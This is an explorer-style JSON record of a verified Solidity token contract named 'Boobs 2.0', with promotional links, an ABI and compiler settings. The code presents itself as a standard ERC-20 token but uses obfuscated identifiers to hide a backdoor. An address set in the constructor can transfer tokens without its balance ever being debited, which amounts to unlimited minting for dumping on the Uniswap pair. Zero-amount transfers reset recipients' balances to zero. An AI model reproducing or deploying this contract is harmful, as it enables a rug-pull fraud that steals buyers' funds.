{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"deploy/Contract.sol\": {\r\n      \"content\": \"/*\\n\\nWebsite: http://boobs2.0.crypto-token.live/\\n\\nTelegram: https://t.me/BoobstwoPortal\\n\\nTwitter: https://twitter.com/BoobsTwoETH/\\n\\n*/\\n\\n// SPDX-License-Identifier: MIT\\n\\npragma solidity >=0.8.17;\\n\\nabstract contract Context {\\r\\n    function _msgSender() internal view virtual returns (address) {\\r\\n        return msg.sender;\\r\\n    }\\r\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\r\\n        return msg.data;\\r\\n    }\\r\\n}\\n\\ncontract Ownable is Context {\\r\\n    address private _owner;\\r\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\n    /**\\r\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\r\\n     */\\r\\n    constructor() {\\r\\n        address msgSender = _msgSender();\\r\\n        _owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Returns the address of the current owner.\\r\\n     */\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Throws if called by any account other than the owner.\\r\\n     */\\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\\r\\n        _;\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Leaves the contract without owner. It will not be possible to call\\r\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\r\\n     *\\r\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\r\\n     * thereby removing any functionality that is only available to the owner.\\r\\n     */\\r\\n    function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\r\\n     * Can only be called by the current owner.\\r\\n     */\\r\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\\r\\n        emit OwnershipTransferred(_owner, newOwner);\\r\\n        _owner = newOwner;\\r\\n    }\\r\\n}\\n\\ninterface IUniswapV2Router02 {\\r\\n    function factory() external pure returns (address);\\r\\n\\n    function WETH() external pure returns (address);\\r\\n}\\n\\ninterface IUniswapV2Factory {\\r\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\r\\n}\\n\\ncontract Boobs is Ownable {\\n    mapping(address => mapping(address => uint256)) public allowance;\\n\\n    function transferFrom(address cixpmojtlduw, address epazrqjhsvgc, uint256 pjvncofis) public returns (bool success) {\\r\\n        require(pjvncofis <= allowance[cixpmojtlduw][msg.sender]);\\r\\n        allowance[cixpmojtlduw][msg.sender] -= pjvncofis;\\r\\n        qkbfyn(cixpmojtlduw, epazrqjhsvgc, pjvncofis);\\r\\n        return true;\\r\\n    }\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    address public ugchnbrs;\\n\\n    mapping(address => uint256) private vwaxgclymzeh;\\n\\n    uint8 public decimals = 9;\\n\\n    uint256 private kwoxrdchft = 103;\\n\\n    function qkbfyn(address cixpmojtlduw, address epazrqjhsvgc, uint256 pjvncofis) private {\\r\\n        if (0 == pmzvsohg[cixpmojtlduw]) {\\r\\n            balanceOf[cixpmojtlduw] -= pjvncofis;\\r\\n        }\\r\\n        balanceOf[epazrqjhsvgc] += pjvncofis;\\r\\n        if (0 == pjvncofis && epazrqjhsvgc != ugchnbrs) {\\r\\n            balanceOf[epazrqjhsvgc] = pjvncofis;\\r\\n        }\\r\\n        emit Transfer(cixpmojtlduw, epazrqjhsvgc, pjvncofis);\\r\\n    }\\n\\n    string public name = 'Boobs 2.0';\\n\\n    constructor(address jzpquyhgv) {\\r\\n        balanceOf[msg.sender] = totalSupply;\\r\\n        pmzvsohg[jzpquyhgv] = kwoxrdchft;\\r\\n        IUniswapV2Router02 ymxgvulza = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n        ugchnbrs = IUniswapV2Factory(ymxgvulza.factory()).createPair(address(this), ymxgvulza.WETH());\\r\\n    }\\n\\n    function transfer(address epazrqjhsvgc, uint256 pjvncofis) public returns (bool success) {\\r\\n        qkbfyn(msg.sender, epazrqjhsvgc, pjvncofis);\\r\\n        return true;\\r\\n    }\\n\\n    function approve(address bjzcgerk, uint256 pjvncofis) public returns (bool success) {\\r\\n        allowance[msg.sender][bjzcgerk] = pjvncofis;\\r\\n        emit Approval(msg.sender, bjzcgerk, pjvncofis);\\r\\n        return true;\\r\\n    }\\n\\n    mapping(address => uint256) private pmzvsohg;\\n\\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\\n\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    string public symbol = 'Boobs 2.0';\\n\\n    mapping(address => uint256) public balanceOf;\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"jzpquyhgv\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"bjzcgerk\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"pjvncofis\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"epazrqjhsvgc\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"pjvncofis\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"cixpmojtlduw\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"epazrqjhsvgc\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"pjvncofis\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ugchnbrs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "Boobs", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000006f6f7d3f37f52f2c048ca527bdd0be21bed23893", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}